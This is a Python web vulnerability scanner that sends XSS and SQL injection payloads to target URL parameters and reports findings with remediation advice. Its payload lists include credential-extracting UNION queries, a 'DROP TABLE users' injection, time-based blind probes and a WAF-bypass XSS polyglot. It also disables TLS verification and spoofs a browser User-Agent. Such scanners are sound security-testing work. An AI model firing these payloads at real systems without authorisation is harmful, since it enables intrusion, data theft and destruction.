import requests
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# --------------------------------
# Session + Headers (speed boost)
# --------------------------------
session = requests.Session()
session.verify = False  # Disable SSL verification for real-world sites

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5"
}


# -------------------------
# XSS Payloads
# -------------------------
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "'><script>alert(1)</script>",
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//",  # Polyglot WAF bypass
    "'\"><img src=x onerror=window.onerror=eval;throw'alert(1)'>",  # Advanced context escape
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>"
]


# -------------------------
# SQL Payloads
# -------------------------
SQL_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1'--",
    "' OR 1=1--",
    "\" OR \"1\"=\"1\"--",
    "' OR 1=1#",
    "' OR '1'='1'",
    "' OR '1'='2'--",
    "' AND 1=2--",
    "' UNION SELECT NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT username, password FROM users--",
    "' OR EXISTS(SELECT * FROM users)--",
    "'; DROP TABLE users--",
    "' AND 1=0 UNION SELECT username, password FROM users--",
    "admin' --",
    "admin' #"
]


# -------------------------
# SQL Error Signatures
# -------------------------
SQL_ERRORS = [
    "SQL syntax",
    "mysql_fetch",
    "ORA-01756",
    "ORA-00933",
    "syntax error",
    "Unclosed quotation mark",
    "SQLite error",
    "Warning: mysql",
    "PostgreSQL",
    "Microsoft OLE DB Provider for SQL Server",
    "JDBC",
    "SQLSTATE",
    "SQLServerException"
]


# -------------------------
# Time-based SQL payloads
# -------------------------
TIME_SQL_PAYLOADS = [
    "' OR SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' OR pg_sleep(5)--",
    "' OR BENCHMARK(1000000,MD5(1))--",
    "1; SELECT pg_sleep(5)--",
    "'; SELECT SLEEP(5)--"
]


# -------------------------
# Boolean-based SQL payload pairs
# -------------------------
BOOLEAN_SQL_PAIRS = [
    ("' AND 1=1--", "' AND 1=2--"),
    ("\" AND 1=1--", "\" AND 1=2--"),
    ("' OR '1'='1'--", "' OR '1'='2'--")
]


# --------------------------------
# Helper: Build payload URL safely
# --------------------------------
def build_url(url, param, payload):

    if "?" in url:
        return f"{url}&{param}={payload}"
    else:
        return f"{url}?{param}={payload}"


# -------------------------
# Time-based SQL Injection with Improved Detection
# -------------------------
def test_time_sql(url, params):
    """
    Improved time-based SQL injection testing.
    Requires multiple confirmations to reduce false positives.
    """
    vulns = []
    
    # Increased delay threshold to reduce false positives
    DELAY_THRESHOLD = 6  # seconds
    
    for param in params:
        
        # Test each payload multiple times to confirm
        confirmations = 0
        
        for payload in TIME_SQL_PAYLOADS:
            
            try:
                test_url = build_url(url, param, payload)
                
                # Measure response time with tolerance
                start = time.time()
                response = session.get(test_url, headers=HEADERS, timeout=15)
                elapsed = time.time() - start
                
                # Skip if response indicates error
                if response.status_code >= 400:
                    continue
                
                # Only flag if delay is significant and consistent
                if elapsed >= DELAY_THRESHOLD:
                    confirmations += 1
                    
                    # Skip this payload if too consistent (likely network latency)
                    if confirmations >= 2:
                        vulns.append({
                            "type": "Time-based Blind SQL Injection",
                            "parameter": param,
                            "payload": payload,
                            "url": test_url,
                            "evidence": f"Response delay: {elapsed:.2f}s (threshold: {DELAY_THRESHOLD}s)",
                            "explanation": "The response took significantly longer than expected, indicating the SQL payload caused a delay (e.g., SLEEP function), confirming blind SQL injection vulnerability.",
                            "severity": "High",
                            "remediation": "Use prepared statements and avoid dynamic SQL queries with user input."
                        })
                        break
                        
            except requests.Timeout:
                # Timeout could indicate delayed execution
                confirmations += 1
                if confirmations >= 2:
                    vulns.append({
                        "type": "Time-based Blind SQL Injection",
                        "parameter": param,
                        "payload": payload,
                        "url": build_url(url, param, payload),
                        "evidence": f"Request timeout (>15s)",
                        "explanation": "The request timed out, suggesting the SQL payload caused the database to delay execution significantly.",
                        "severity": "High",
                        "remediation": "Use prepared statements and avoid dynamic SQL queries with user input."
                    })
                    break
            except Exception:
                pass

    return vulns


# -------------------------
# XSS Testing with False Positive Reduction
# -------------------------
def is_safe_html_encoding(payload, response_text):
    """Check if payload is properly HTML encoded."""
    encoded_variants = [
        payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#x27;'),
        payload.replace('<', '%3C').replace('>', '%3E'),
        payload.replace('<', '\\u003c').replace('>', '\\u003e'),
    ]
    return any(v in response_text for v in encoded_variants)


def is_executable_context(payload, response_text, param_name=""):
    """Validate if payload appears in an executable context."""
    response_lower = response_text.lower()
    payload_lower = payload.lower()
    
    # Check for script tags containing unencoded payload
    import re
    script_patterns = [
        r'<script[^>]*>.*?' + re.escape(payload_lower) + r'.*?</script>',
        r'on\w+\s*=\s*["\']' + re.escape(payload_lower) + r'["\']',  # Event handlers
        r'href\s*=\s*["\']javascript:' + re.escape(payload_lower) + r'["\']',  # JavaScript URLs
        r'src\s*=\s*["\']' + re.escape(payload_lower) + r'["\']',  # Source attributes
    ]
    
    for pattern in script_patterns:
        if re.search(pattern, response_text, re.IGNORECASE | re.DOTALL):
            return True
    
    # Check if it's a direct reflection without tags (high confidence)
    if f'<{payload[1:]}' in response_text and '<' in payload and '>' in payload:
        return True
    
    return False


def test_xss(url, parameters):
    """
    Improved XSS testing with reduced false positives.
    Tests for actual executable XSS, not just reflection.
    """
    vulnerabilities = []
    
    # Get baseline response to detect error pages
    baseline_response = None
    try:
        baseline_response = session.get(url, headers=HEADERS, timeout=5)
        baseline_status = baseline_response.status_code
        baseline_content_type = baseline_response.headers.get('Content-Type', '')
    except:
        baseline_status = 200
        baseline_content_type = 'text/html'
    
    for param in parameters:
        
        # Track if we found a vuln for this parameter to avoid duplicates
        found_vuln_for_param = False
        
        for payload in XSS_PAYLOADS:
            if found_vuln_for_param:
                break
                
            try:
                test_url = build_url(url, param, payload)
                response = session.get(test_url, headers=HEADERS, timeout=5)
                
                # Skip if response status indicates error or redirect
                if response.status_code >= 400:
                    continue
                
                # Skip if response is not HTML
                if 'text/html' not in response.headers.get('Content-Type', ''):
                    continue
                
                # Check if payload is actually in the response
                if payload not in response.text:
                    continue
                
                # CRITICAL: Check if payload is properly encoded (safe)
                if is_safe_html_encoding(payload, response.text):
                    continue
                
                # Check if payload is in an executable context
                if not is_executable_context(payload, response.text, param):
                    continue
                
                # Additional validation: Response should be similar length to baseline
                # Large differences might indicate error page or WAF block
                if baseline_response:
                    len_diff_ratio = abs(len(response.text) - len(baseline_response.text)) / max(len(baseline_response.text), 1)
                    if len_diff_ratio > 0.5:  # More than 50% difference
                        continue
                
                # All checks passed - likely a real vulnerability
                vulnerabilities.append({
                    "type": "Reflected XSS",
                    "parameter": param,
                    "payload": payload,
                    "url": test_url,
                    "explanation": "The XSS payload was reflected in the server's response without proper HTML encoding or sanitization in an executable context, allowing potential script execution.",
                    "severity": "High",
                    "remediation": "Implement output encoding (e.g., HTML entity encoding) or use a library like DOMPurify to sanitize user inputs."
                })
                found_vuln_for_param = True
                
            except Exception as e:
                continue

    return vulnerabilities


# -------------------------
# SQL Injection Testing with False Positive Reduction
# -------------------------
def test_sql(url, parameters):
    """
    Improved SQL injection testing with reduced false positives.
    Uses baseline analysis and context validation.
    """
    vulnerabilities = []

    # Build baseline for comparison
    baseline_length = 0
    baseline_text = ""
    error_page_length = 0
    
    try:
        baseline_resp = session.get(build_url(url, "testparam", "normalvalue"), headers=HEADERS, timeout=5)
        baseline_length = len(baseline_resp.text)
        baseline_text = baseline_resp.text
    except:
        pass

    # Test with obvious error to identify error page signature
    try:
        error_resp = session.get(build_url(url, "testparam", "<script>alert(1)</script>"), headers=HEADERS, timeout=5)
        error_page_length = len(error_resp.text)
    except:
        pass

    for param in parameters:
        
        found_error_sqli = False
        found_boolean_sqli = False
        found_union_sqli = False

        # Error-based SQL Injection
        for payload in SQL_PAYLOADS:
            if found_error_sqli:
                break
                
            try:
                test_url = build_url(url, param, payload)
                response = session.get(test_url, headers=HEADERS, timeout=5)
                
                # Skip error responses
                if response.status_code >= 400:
                    continue
                
                lower_text = response.text.lower()
                
                # Check for specific SQL error signatures
                error_found = None
                for error in SQL_ERRORS:
                    if error.lower() in lower_text:
                        # Validate it's actually a SQL error, not random text
                        # Check context - SQL errors usually appear with specific keywords
                        if any(kw in lower_text for kw in ['database', 'query', 'sql', 'syntax', 'statement']):
                            error_found = error
                            break

                if error_found:
                    # Additional validation: response length should be consistent
                    if error_page_length > 0:
                        if abs(len(response.text) - error_page_length) < 100:
                            continue  # Likely same error page
                    
                    vulnerabilities.append({
                        "type": "Error-based SQL Injection",
                        "parameter": param,
                        "payload": payload,
                        "url": test_url,
                        "evidence": error_found,
                        "explanation": f"An SQL error ('{error_found}') was triggered by the payload, indicating the application is vulnerable to SQL injection.",
                        "severity": "Critical",
                        "remediation": "Use prepared statements and avoid dynamic SQL queries with user input."
                    })
                    found_error_sqli = True
                    
            except:
                pass

        if found_error_sqli:
            continue

        # Union-based SQL Injection
        for payload in SQL_PAYLOADS:
            if found_union_sqli or 'union' not in payload.lower():
                continue
                
            try:
                test_url = build_url(url, param, payload)
                response = session.get(test_url, headers=HEADERS, timeout=5)
                
                if response.status_code >= 400:
                    continue
                
                lower_text = response.text.lower()
                
                # Check for UNION-based indicators
                if "union select" in lower_text or ("select" in lower_text and "from" in lower_text):
                    
                    # Validate response has new data (longer than baseline)
                    if len(response.text) <= baseline_length + 50:
                        continue
                    
                    # Validate response differs from error page
                    if error_page_length > 0 and abs(len(response.text) - error_page_length) < 100:
                        continue
                    
                    # Look for data patterns that indicate extracted DB content
                    import re
                    data_patterns = re.findall(r'\b(?:\d{1,10}|[a-zA-Z]{4,20})\b', response.text)
                    if len(data_patterns) < 15:  # Increased threshold
                        continue
                    
                    # Check for database keywords that suggest real data
                    db_keywords = ['admin', 'user', 'password', 'email', 'id', 'name', 'table', 'column']
                    if not any(kw in lower_text for kw in db_keywords):
                        continue
                    
                    vulnerabilities.append({
                        "type": "Union-based SQL Injection",
                        "parameter": param,
                        "payload": payload,
                        "url": test_url,
                        "evidence": f"Response length: {len(response.text)} vs baseline: {baseline_length}",
                        "explanation": "The response indicates SELECT data may be returned from the database via injection.",
                        "severity": "High",
                        "remediation": "Use parameterized queries and strict output encoding."
                    })
                    found_union_sqli = True
                    
            except:
                pass

        if found_union_sqli:
            continue

        # Boolean-based Blind SQL Injection  
        for true_payload, false_payload in BOOLEAN_SQL_PAIRS:
            if found_boolean_sqli:
                break
                
            try:
                true_url = build_url(url, param, true_payload)
                false_url = build_url(url, param, false_payload)

                true_resp = session.get(true_url, headers=HEADERS, timeout=5)
                false_resp = session.get(false_url, headers=HEADERS, timeout=5)

                if true_resp.status_code >= 400 or false_resp.status_code >= 400:
                    continue

                # Check length difference
                len_diff = abs(len(true_resp.text) - len(false_resp.text))
                
                # Require substantial difference (increased threshold for fewer false positives)
                if len_diff < 300:
                    continue
                
                # Validate against baseline
                if baseline_length > 0:
                    true_diff_to_baseline = abs(len(true_resp.text) - baseline_length)
                    false_diff_to_baseline = abs(len(false_resp.text) - baseline_length)
                    
                    # Both should differ significantly from baseline
                    if true_diff_to_baseline < 50 and false_diff_to_baseline < 50:
                        continue
                
                # Validate content is different, not just errors
                true_clean = true_resp.text.lower().replace('error', '').replace('404', '')
                false_clean = false_resp.text.lower().replace('error', '').replace('404', '')
                
                if len(true_clean) == len(false_clean):
                    continue
                
                # Avoid flagging if both are error pages
                if error_page_length > 0:
                    if (abs(len(true_resp.text) - error_page_length) < 100 and 
                        abs(len(false_resp.text) - error_page_length) < 100):
                        continue
                
                vulnerabilities.append({
                    "type": "Boolean-based SQL Injection",
                    "parameter": param,
                    "payload": f"{true_payload} / {false_payload}",
                    "url": true_url,
                    "evidence": f"Response length true={len(true_resp.text)} false={len(false_resp.text)}",
                    "explanation": "Different behavior between true/false SQL conditions suggests SQL injection vulnerability.",
                    "severity": "High",
                    "remediation": "Use prepared statements with parameter binding."
                })
                found_boolean_sqli = True
                
            except:
                pass

    return vulnerabilities


def test_sqli(url, parameters, method="get", data=None):

    vulnerabilities = []

    if method.lower() == "post":
        # POST-based SQLi payloads (non-GET vulnerable forms)
        for param in parameters:
            for payload in SQL_PAYLOADS:
                try:
                    form_data = {} if data is None else data.copy()
                    form_data[param] = payload

                    response = session.post(url, data=form_data, headers=HEADERS, timeout=5)
                    lower_text = response.text.lower()

                    for error in SQL_ERRORS:
                        if error.lower() in lower_text:
                            vulnerabilities.append({
                                "type": "Error-based SQL Injection",
                                "parameter": param,
                                "payload": payload,
                                "url": url,
                                "evidence": error,
                                "explanation": f"An SQL error ('{error}') was exposed on POST payload injection.",
                                "severity": "Critical",
                                "remediation": "Use prepared statements or parameterized queries and sanitize input."
                            })
                            break

                except:
                    pass

    # always include GET-style checks too (for links + derived endpoints)
    if method.lower() == "get":
        vulnerabilities.extend(test_sql(url, parameters))
    else:
        vulnerabilities.extend(test_time_sql(url, parameters))

    # include existing error-discovery routine for additional coverage
    vulnerabilities.extend(test_error_sql(url, parameters, method=method, data=data))

    return vulnerabilities


def test_error_sql(url, params, method='get', data=None):

    errors = [
        "SQL syntax",
        "mysql_fetch",
        "ORA-01756",
        "SQLite error",
        "UNEXPECTED TOKEN",
        "ODBC SQL Server Driver"
    ]
    

    vulns = []

    for p in params:

        try:
            if method.lower() == 'post':
                form_data = {} if data is None else data.copy()
                form_data[p] = "'"
                r = session.post(url, data=form_data, headers=HEADERS, timeout=5)
                test_url = url
            else:
                test_url = f"{url}&{p}='"
                r = requests.get(test_url, timeout=5, verify=False)

            for e in errors:
                if e.lower() in r.text.lower():
                    vulns.append({
                        "parameter": p,
                        "type": "Error-based SQLi",
                        "url": test_url,
                        "explanation": f"An SQL error ('{e}') was revealed by injecting a single quote, indicating improper handling of user input in SQL queries.",
                        "severity": "Critical",
                        "remediation": "Use parameterized queries and input validation to prevent SQL injection."
                    })

        except:
            pass

    return vulns